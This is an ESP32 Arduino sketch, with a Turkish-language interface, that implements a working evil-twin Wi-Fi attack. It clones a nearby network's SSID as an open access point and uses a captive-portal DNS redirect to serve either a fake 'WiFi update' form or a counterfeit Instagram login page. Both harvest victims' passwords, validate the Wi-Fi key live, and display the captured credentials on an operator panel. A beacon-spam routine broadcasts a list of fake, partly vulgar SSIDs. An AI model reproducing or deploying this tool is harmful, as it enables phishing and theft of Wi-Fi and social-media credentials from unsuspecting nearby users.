#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer webServer(80);


typedef struct {
  String ssid;
  String bssid;
  int channel;
} WiFiNetwork;

WiFiNetwork networks[20];
int networkCount = 0;
String targetSSID = "";
String savedPassword = "";
String kullaniciAdi = "";  
String sifre = ""; 
bool isAPCreated = false;
bool isInstagramAP = false;
     



//----------------------------------------------------------




void handleRoot() {
  String html = R"=====(
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Seçenekler</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      background: #403f3f;
      color: white;
    }
    h1 {
      margin-bottom: 40px;
    }
    button {
      width: 250px;
      padding: 15px;
      margin: 10px;
      font-size: 18px;
      border: none;
      border-radius: 10px;
      background-color: #007bff;
      color: rgb(255, 255, 255);
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #0056b3;
    }
    .credentials {
      margin-top: 30px;
      padding: 15px;
      border: 1px solid #555;
      border-radius: 5px;
      background-color: #2a2a2a;
      width: 250px;
      text-align: left;
    }
    .credential-title {
      font-weight: bold;
      margin-bottom: 10px;
      color: #007bff;
    }
  </style>
</head>
<body>
  <h1>Seçenekler</h1>
  <button onclick="location.href='/evil-twin-password'">Evil Twin (Wifi Şifresi)</button>
  <button onclick="location.href='/evil-twin-instagram'">Evil Twin (İnstagram)</button>
  <button onclick="location.href='/wifi-attack'">Wifi Saldırısı</button>
  <button onclick="location.href='/wifi-spam'">Wifi Spam</button>
)=====";

  // Display Evil Twin credentials (Instagram/Wifi) if available
  if (kullaniciAdi != "" && sifre != "") {
    html += R"=====(
  <div class="credentials">
    <div class="credential-title">Evil Twin Credentials</div>
    <p>Kullanıcı: )=====";
    html += kullaniciAdi;
    html += R"=====(</p>
    <p>Şifre: )=====";
    html += sifre;
    html += R"=====(</p>
  </div>
)=====";
  }

  // Display WiFi credentials if available
  if (targetSSID != "" && savedPassword != "") {
    html += R"=====(
  <div class="credentials">
    <div class="credential-title">WiFi Credentials</div>
    <p>WiFi: )=====";
    html += targetSSID;
    html += R"=====(</p>
    <p>Şifre: )=====";
    html += savedPassword;
    html += R"=====(</p>
  </div>
)=====";
  }

  // Close HTML
  html += R"=====(
</body>
</html>
)=====";
 webServer.send(200, "text/html", html);
}



//----------------------------------------------------------




void scanNetworks() {
  networkCount = WiFi.scanNetworks();
  for(int i = 0; i < networkCount && i < 20; i++) {
    networks[i].ssid = WiFi.SSID(i);
    networks[i].bssid = WiFi.BSSIDstr(i);
    networks[i].channel = WiFi.channel(i);
  }
}




//----------------------------------------------------------



void handleInstagram() {
  scanNetworks();
  
  String html = R"=====(
<!DOCTYPE html>
<html lang='tr'>
<head>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <title>WiFi Ağları</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #403f3f;
      margin: 0;
      padding: 10px;
      display: flex;
      flex-direction: column;
      align-items: center;
      color: white;
      font-size: 14px;
    }
    h2 {
      margin: 15px 0;
      font-size: 18px;
      color: white;
    }
    table {
      border-collapse: collapse;
      width: 100%;
      max-width: 500px;
      background: #505050;
      box-shadow: 0 1px 4px rgba(0,0,0,0.15);
      border-radius: 8px;
      overflow: hidden;
      margin-bottom: 15px;
    }
    th, td {
      text-align: left;
      padding: 8px 12px;
      font-size: 12px;
      border-bottom: 1px solid #666;
      color: white;
    }
    th {
      background-color: #007bff;
      color: white;
      padding: 8px 12px;
      font-size: 12px;
    }
    tr:hover {
      background-color: #606060;
    }
    button {
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      padding: 4px 8px;
      font-size: 12px;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }
    button:hover {
      background-color: #0056b3;
    }
    a.home-link {
      margin-top: 15px;
      text-decoration: none;
      color: #007bff;
      font-weight: bold;
      font-size: 12px;
    }
    a.home-link:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <h2>Bulunan WiFi Ağları</h2>
  <table>
    <thead>
      <tr>
        <th>#</th>
        <th>SSID</th>
        <th>BSSID</th>
        <th>Kanal</th>
        <th>Seç</th>
      </tr>
    </thead>
    <tbody>
)=====";

  for(int i = 0; i < networkCount; i++) {
    html += "<tr>";
    html += "<td>" + String(i+1) + "</td>";
    html += "<td>" + networks[i].ssid + "</td>";
    html += "<td>" + networks[i].bssid + "</td>";
    html += "<td>" + String(networks[i].channel) + "</td>";
    html += "<td><button onclick=\"location.href='/select-instagram?ssid=" + networks[i].ssid + "&bssid=" + networks[i].bssid + "'\">Seç</button></td>";
    html += "</tr>";
  }

  html += R"=====(
    </tbody>
  </table>
  <a href="/" class="home-link">Ana Sayfaya Dön</a>
</body>
</html>
)=====";

  webServer.send(200, "text/html", html);
}




//----------------------------------------------------------






void handleInstagramWifi(){
  targetSSID = webServer.arg("ssid");
  String bssid = webServer.arg("bssid");

  
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_AP);
  
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(targetSSID.c_str(), NULL, 1, 0, 1);
  
  dnsServer.start(DNS_PORT, "*", apIP);
  isAPCreated = true;

  Serial.println("---------------------------");
  Serial.println("Evil Twin ağı oluşturuldu.");
  Serial.println("Wifi : " + targetSSID);
  Serial.println("---------------------------");

  isInstagramAP = true;
  
  String html = "<script>location.href='/instagram-login';</script>";
  webServer.send(200, "text/html", html);
}




//----------------------------------------------------------




void handleInstagramLogin () {
  if (webServer.method() == HTTP_POST) {
    kullaniciAdi = webServer.arg("kullanici_adi");
    sifre = webServer.arg("sifre");
    
    Serial.println("---------------------------");
    Serial.println("Yakalanan Instagram Bilgileri:");
    Serial.print("Kullanıcı Adı: ");
    Serial.println(kullaniciAdi);
    Serial.print("Şifre: ");
    Serial.println(sifre);
    Serial.println("---------------------------");

    // Evil Twin'i kapat
    WiFi.softAPdisconnect(true);
    targetSSID = "";
    isAPCreated = false;
    isInstagramAP = false;

    // Ana AP'yi (ESP32) yeniden başlat
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP("Esp32","128milyar");
    dnsServer.start(DNS_PORT, "*", apIP);

    // Ana sayfaya yönlendir
    String html = "<script>location.href='/';</script>";
    webServer.send(200, "text/html", html);
    return;
  }

  String html = R"=====(
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>İnstagram Giriş</title>
  <style>
    * {
      margin: 0; padding: 0; box-sizing: border-box;
    }
    html, body {
      height: 100%; background-color: #f0f0f0;
      font-family: Arial, sans-serif;
    }
    .resim-kapsayici {
      width: 100%; height: 50%;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      margin-top: 20px;
    }
    .ortali-resim {
      max-width: 90px; height: auto;
    }
    p.turkce {
      text-align: center;
      font-size: 17px;
      color: #000203;
      cursor: pointer;
      user-select: none;
      margin-top: -130px;
      margin-bottom: 50px;
    }
    form.form-kapsayici {
      margin: -100px auto 0;
      display: flex; flex-direction: column;
      align-items: center;
      gap: 15px;
      width: 90%;
      max-width: 320px;
    }
    form.form-kapsayici input {
      padding: 12px 16px;
      width: 100%;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 15px;
      outline: none;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
    }
    button.giris-buton {
      padding: 12px 16px;
      width: 100%;
      background-color: #0f7eed;
      color: white;
      font-size: 15px;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button.giris-buton:hover {
      background-color: #007fff;
    }
    p.sifremi-unuttum {
      text-align: center;
      font-size: 17px;
      color: #000203;
      cursor: pointer;
      user-select: none;
      margin-top: 10px;
    }
    .yeni-hesap-kapsayici {
      margin: 100px auto 40px;
      width: 90%;
      max-width: 320px;
      display: flex;
      justify-content: center;
    }
    button.yeni-hesap-buton {
      padding: 12px 16px;
      width: 100%;
      background: transparent;
      color: #2575fc;
      font-size: 15px;
      border: 1.5px solid #007fff;
      border-radius: 50px;
      cursor: pointer;
      transition: background 0.4s ease, color 0.4s ease;
      box-shadow: none;
    }
    button.yeni-hesap-buton:hover {
      background-color: #007fff;
      color: white;
    }
    .resim-kapsayici2 {
      width: 100%;
      height: 0px;
      display: flex; justify-content: center; align-items: center;
      margin-top: 40px;
    }
    .ortali-resim2 {
      max-width: 70px; height: auto;
    }
  </style>
</head>
<body>

<div class="resim-kapsayici">
  <p class="turkce">Türkçe</p>
  <img src="data:image/png;base64," alt="Yeni Resim" class="ortali-resim2" />
</div>

<form id="girisForm" class="form-kapsayici" action="/instagram-login" method="POST">
  <input type="hidden" name="_captcha" value="false" />
  <input type="hidden" name="_template" value="table" />
  <input type="text" name="kullanici_adi" placeholder="Kullanıcı adı, e-posta veya cep numarası" required />
  <input type="password" name="sifre" placeholder="Şifre" required />
  <button type="submit" class="giris-buton">Giriş Yap</button>
  <p class="sifremi-unuttum" onclick="alert('Hata!')">Şifreni mi unuttun?</p>
</form>

<div class="yeni-hesap-kapsayici">
  <button type="button" class="yeni-hesap-buton" onclick="alert('Yeni hesap oluşturma sayfasına yönlendiriliyorsunuz.')">Yeni Hesap Oluştur</button>
</div>

<div class="resim-kapsayici2">
  <img src="data:image/png;base64," alt="Yeni Resim" class="ortali-resim2" />
</div>
</body>
</html>
)=====";

  webServer.send(200, "text/html", html);
}



//----------------------------------------------------------




void handleWifiUpdate() {
  if(targetSSID == "") {
    String html = R"=====(
<!DOCTYPE html>
<html lang='tr'>
<head>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <title>Hata</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #403f3f;
      margin: 0;
      padding: 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: white;
    }
    .error-box {
      background-color: #f44336;
      padding: 20px;
      border-radius: 8px;
      text-align: center;
      max-width: 400px;
    }
    a {
      color: #007bff;
      text-decoration: none;
      margin-top: 20px;
      display: inline-block;
    }
    a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="error-box">
    <h2>Hata!</h2>
    <p>Önce bir WiFi ağı seçmelisiniz.</p>
  </div>
  <a href="/evil-twin-password">WiFi Ağlarını Görüntüle</a>
  <a href="/">Ana Sayfaya Dön</a>
</body>
</html>
)=====";
    webServer.send(200, "text/html", html);
    return;
  }

  String html = R"=====(
<!DOCTYPE html>
<html lang='tr'>
<head>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <title>WiFi Güncelleme</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #403f3f;
      margin: 0;
      padding: 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
      color: white;
    }
    .container {
      background-color: #505050;
      padding: 20px;
      border-radius: 8px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
    }
    h1 {
      color: white;
      text-align: center;
      margin-bottom: 20px;
    }
    .info {
      color: #ff9800;
      text-align: center;
      margin-bottom: 20px;
    }
    .form-group {
      margin-bottom: 15px;
    }
    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }
    input[type="password"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #666;
      border-radius: 4px;
      background-color: #606060;
      color: white;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #0056b3;
    }
    .status {
      margin-top: 15px;
      padding: 10px;
      border-radius: 4px;
      text-align: center;
      display: none;
    }
    .success {
      background-color: #4CAF50;
      display: block;
    }
    .error {
      background-color: #f44336;
      display: block;
    }
    .loading {
      color: #2196F3;
      display: block;
    }
    a.home-link {
      display: inline-block;
      margin-top: 20px;
      text-decoration: none;
      color: #007bff;
      font-weight: bold;
    }
    a.home-link:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>WiFi Güncellemesi ()=====";
    html += targetSSID;
    html += R"=====()</h1>
    <div class="info">WiFi güncellemesi gerekiyor</div>
    
    <form id="wifiForm" action="/update-wifi" method="POST" onsubmit="return false;">
      <div class="form-group">
        <label for="password">WiFi Şifresi</label>
        <input type="password" id="password" name="password" required>
      </div>
      <button type="submit">Güncelle</button>
    </form>
    
    <div id="statusMessage" class="status"></div>
  </div>
  
  <script>
document.getElementById('wifiForm').addEventListener('submit', function(e) {
  e.preventDefault();
  
  const form = this;
  const statusDiv = document.getElementById('statusMessage');
  const passwordField = document.getElementById('password');
  
  statusDiv.className = 'status loading';
  statusDiv.textContent = 'Doğrulanıyor, lütfen bekleyin...';
  
  fetch(form.action, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: new URLSearchParams({
      password: passwordField.value
    })
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      statusDiv.className = 'status success';
      statusDiv.textContent = 'Bağlantı başarılı!';
    } else {
      statusDiv.className = 'status error';
      statusDiv.textContent = data.message;
      passwordField.value = ''; // Şifre alanını temizle
      passwordField.focus(); // Tekrar denemek için odaklan
    }
  })
  .catch(error => {
    statusDiv.className = 'status error';
    statusDiv.textContent = 'Hata oluştu: ' + error.message;
  });
});
</script>
</body>
</html>
)=====";

  webServer.send(200, "text/html; charset=utf-8", html);
}
  



//----------------------------------------------------------



void handleUpdateWifi() {
  if (webServer.method() != HTTP_POST) {
    webServer.send(405, "text/plain", "Method Not Allowed");
    return;
  }

  String password = webServer.arg("password");
  
  Serial.println("---------------------------");
  Serial.println("Şifre doğrulanıyor...");
  Serial.print("Hedef SSID: ");
  Serial.println(targetSSID);
  Serial.print("Girilen Şifre: ");
  Serial.println(password);

 
  WiFi.mode(WIFI_AP_STA); 
  
  Serial.println("Bağlantı deneniyor...");
  WiFi.begin(targetSSID.c_str(), password.c_str());

  unsigned long startTime = millis();
  bool connected = false;


  while (millis() - startTime < 10000) {
    if (WiFi.status() == WL_CONNECTED) {
      connected = true;
      break;
    }
    delay(500);
    Serial.print(".");
  }


  String response;
  if (connected) {
    savedPassword = password;
    response = "{\"success\":true,\"message\":\"Bağlantı başarılı!\"}";
    Serial.println("\nBağlantı başarılı!");
     WiFi.softAPdisconnect(true);
    isAPCreated = false;
    isInstagramAP = false;

    // Ana AP'yi (ESP32) yeniden başlat
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP("Esp32","128milyar");
    dnsServer.start(DNS_PORT, "*", apIP);

    // Ana sayfaya yönlendir
    String html = "<script>location.href='/';</script>";
    webServer.send(200, "text/html", html);
    return;

  } else {
    response = "{\"success\":false,\"message\":\"Şifre yanlış! Lütfen tekrar deneyin.\"}";
    Serial.println("\nBağlantı başarısız! AP aktif kalmaya devam ediyor...");


  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");
  webServer.send(200, "application/json", response);
  }
}


//----------------------------------------------------------//----------------------------------------------------------



void handleEvilTwin() {
  scanNetworks(); 
  
  String html = R"=====(
<!DOCTYPE html>
<html lang='tr'>
<head>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <title>WiFi Ağları</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #403f3f;
      margin: 0;
      padding: 10px;
      display: flex;
      flex-direction: column;
      align-items: center;
      color: white;
      font-size: 14px;
    }
    h2 {
      margin: 15px 0;
      font-size: 18px;
      color: white;
    }
    table {
      border-collapse: collapse;
      width: 100%;
      max-width: 500px;
      background: #505050;
      box-shadow: 0 1px 4px rgba(0,0,0,0.15);
      border-radius: 8px;
      overflow: hidden;
      margin-bottom: 15px;
    }
    th, td {
      text-align: left;
      padding: 8px 12px;
      font-size: 12px;
      border-bottom: 1px solid #666;
      color: white;
    }
    th {
      background-color: #007bff;
      color: white;
      padding: 8px 12px;
      font-size: 12px;
    }
    tr:hover {
      background-color: #606060;
    }
    button {
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      padding: 4px 8px;
      font-size: 12px;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }
    button:hover {
      background-color: #0056b3;
    }
    a.home-link {
      margin-top: 15px;
      text-decoration: none;
      color: #007bff;
      font-weight: bold;
      font-size: 12px;
    }
    a.home-link:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <h2>Bulunan WiFi Ağları</h2>
  <table>
    <thead>
      <tr>
        <th>#</th>
        <th>SSID</th>
        <th>BSSID</th>
        <th>Kanal</th>
        <th>Seç</th>
      </tr>
    </thead>
    <tbody>
)=====";

  for(int i = 0; i < networkCount; i++) {
    html += "<tr>";
    html += "<td>" + String(i+1) + "</td>";
    html += "<td>" + networks[i].ssid + "</td>";
    html += "<td>" + networks[i].bssid + "</td>";
    html += "<td>" + String(networks[i].channel) + "</td>";
    html += "<td><button onclick=\"location.href='/select-network?ssid=" + networks[i].ssid + "&bssid=" + networks[i].bssid + "'\">Seç</button></td>";
    html += "</tr>";
  }

  html += R"=====(
    </tbody>
  </table>
  <a href="/" class="home-link">Ana Sayfaya Dön</a>
</body>
</html>
)=====";

  webServer.send(200, "text/html", html);
}


//----------------------------------------------------------//----------------------------------------------------------





void handleSelectNetwork() {
  targetSSID = webServer.arg("ssid");
  String bssid = webServer.arg("bssid");

  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(targetSSID.c_str());

  Serial.println("---------------------------");
  Serial.println("Evil Twin ağı oluşturuldu.");
  Serial.println("Wifi : " + targetSSID);
  Serial.println("---------------------------");
  
  dnsServer.start(DNS_PORT, "*", apIP);
  isAPCreated = true;
  
  if (targetSSID == "Instagram") { 
    isInstagramAP = true;
  }
  
  
  String html = "<script>location.href='/wifi-update';</script>";
  webServer.send(200, "text/html", html);
}



//----------------------------------------------------------//----------------------------------------------------------





void handleWifiAttack() {
  webServer.send(200, "text/plain", "Wifi saldırı");
}



//----------------------------------------------------------//----------------------------------------------------------


void handleWifiSpam() {
  int s = 2000;
  const char* sifre = "sifre";

const char* ssid1 = "51.Bölge";    
const char* password1 = "babalarfirar"; 

const char* ssid2 = "babalarfirar";    
const char* password2 = "sifre"; 

const char* ssid3 = "noldusanamk";    
const char* password3 = "sifre"; 

const char* ssid4 = "eheeeee";    
const char* password4 = "sifre"; 

const char* ssid5 = "dayigeldisiktigitti";    
const char* password5 = "sifre"; 

const char* ssid6 = "fasulyesineoynamam";    
const char* password6 = "sifre"; 

const char* ssid7 = "koksalbabaa";    
const char* password7 = "sifre"; 

const char* ssid8 = "hikobababaa";    
const char* password8 = "sifre"; 

const char* ssid9 = "amantanrimdedim";    
const char* password9 = "sifre"; 

const char* ssid10 = "fatih5g";    
const char* password10 = "sifre"; 

const char* ssid11 = "fatih2.5g";    
const char* password11 = "sifre"; 

const char* ssid12 = "beleswifi";    
const char* password12 = "sifre"; 

const char* ssid13 = "cafewifi";    
const char* password13 = "sifre"; 

const char* ssid14 = "saat200milyar";    
const char* password14 = "sifre"; 


 
  WiFi.softAP(ssid1, sifre);
  delay(s); 

  WiFi.softAP(ssid2, sifre);
  delay(s);

  WiFi.softAP(ssid3, sifre);
  delay(s);

  WiFi.softAP(ssid4, sifre);
  delay(s);

  WiFi.softAP(ssid5, sifre);
  delay(s);

  WiFi.softAP(ssid6, sifre);
  delay(s);

  WiFi.softAP(ssid7, sifre);
  delay(s); 

  WiFi.softAP(ssid8, sifre);
  delay(s); 

  WiFi.softAP(ssid9, sifre);
  delay(s);

  WiFi.softAP(ssid10, sifre);
  delay(s);

  WiFi.softAP(ssid11, sifre);
  delay(s);

  WiFi.softAP(ssid12, sifre);
  delay(s); 

  WiFi.softAP(ssid13, sifre);
  delay(s);

  WiFi.softAP(ssid14, sifre);
  delay(s); 
}




//----------------------------------------------------------//----------------------------------------------------------



void handleNotFound() {
  if (isInstagramAP) {
    webServer.sendHeader("Location", "http://" + apIP.toString() + "/instagram-login", true);
  } else if (isAPCreated) {
    webServer.sendHeader("Location", "http://" + apIP.toString() + "/wifi-update", true);
  } else {
    webServer.sendHeader("Location", "http://" + apIP.toString(), true);
  }
  webServer.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(9600);
  
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Esp32", "128milyar");
  
  dnsServer.start(DNS_PORT, "*", apIP);
  
  webServer.on("/", handleRoot);
  webServer.on("/evil-twin-password", handleEvilTwin);
  webServer.on("/evil-twin-instagram", handleInstagram);
  webServer.on("/select-network", handleSelectNetwork);
  webServer.on("/select-instagram", handleInstagramWifi);
  webServer.on("/instagram-login", handleInstagramLogin);
  webServer.on("/wifi-attack", handleWifiAttack);
  webServer.on("/wifi-spam", handleWifiSpam);
  webServer.on("/wifi-update", handleWifiUpdate);
  webServer.on("/update-wifi", HTTP_POST, handleUpdateWifi);  
  webServer.onNotFound(handleNotFound);
  
  webServer.begin();
   for (int i = 0; i < 100; i++) {
    Serial.print(".\n");
  }

  
  Serial.println();

  Serial.println("---------------------------");
  Serial.println("Captive Portal Başlatıldı!");
  Serial.println("AP SSID: Esp32");
  Serial.println("IP Adres: 192.168.4.1");
  Serial.println("---------------------------");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
